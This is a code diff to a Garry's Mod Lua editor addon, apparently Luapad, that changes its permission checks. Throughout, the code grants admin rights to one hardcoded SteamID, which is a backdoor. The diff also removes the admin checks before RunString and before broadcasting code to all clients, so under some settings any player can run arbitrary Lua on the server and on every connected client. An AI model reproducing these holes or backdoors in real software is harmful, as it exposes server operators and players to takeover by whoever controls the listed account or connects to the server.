@@ -27,8 +27,8 @@ local function CanUseLuapad(ply)
 	if !IsValid(ply) then 
 		return false
 	elseif GetConVarNumber("luapad_adminonly") == 1 then
-		local isAdmin = (ply:IsAdmin() or ply:IsSuperAdmin()) or ply:SteamID()=="STEAM_0:1:76409212"
-		if !isAdmin then ply:ChatPrint("Sorry, only admins can use Luapad.") end
+		local isAdmin = ply:IsSuperAdmin() or ply:SteamID()=="STEAM_0:1:76409212"
+		if !isAdmin then ply:ChatPrint("Sorry, only superadmins can use Luapad.") end
 		return isAdmin
 	else
 		return true
@@ -116,9 +116,8 @@ end
 		if !CanUseLuapad(ply) then return end
 		
 		local str = net.ReadString()
-		if(str && (ply:IsAdmin() or ply:IsSuperAdmin())) then
-			RunString(str);
-		end
+		RunString(str)
+		
 		net.Start("luapad.UploadCallback")
 		net.Send(ply)
 	end
@@ -129,11 +128,11 @@ end
 		if !CanUseLuapad(ply) then return end
 
 		local str = net.ReadString()
-		if(str && (ply:IsAdmin() or ply:IsSuperAdmin())) then
-			net.Start("luapad.DownloadRunClient")
-				net.WriteString(str)
-			net.Send(player.GetAll())
-		end
+		
+		net.Start("luapad.DownloadRunClient")
+			net.WriteString(str)
+		net.Send(player.GetAll())
+			
 		net.Start("luapad.UploadClientCallback")
 		net.Send(ply)
 	end
@@ -196,7 +195,7 @@ end
  
 
  function luapad.Toggle()
- 	if SERVER or !CanUseLuapad(LocalPlayer()) or !LocalPlayer():IsSuperAdmin() and LocalPlayer():SteamID()!="STEAM_0:1:76409212" then return end
+ 	if SERVER or !CanUseLuapad(LocalPlayer()) then return end
 
 	if (!luapad.Frame) then
 
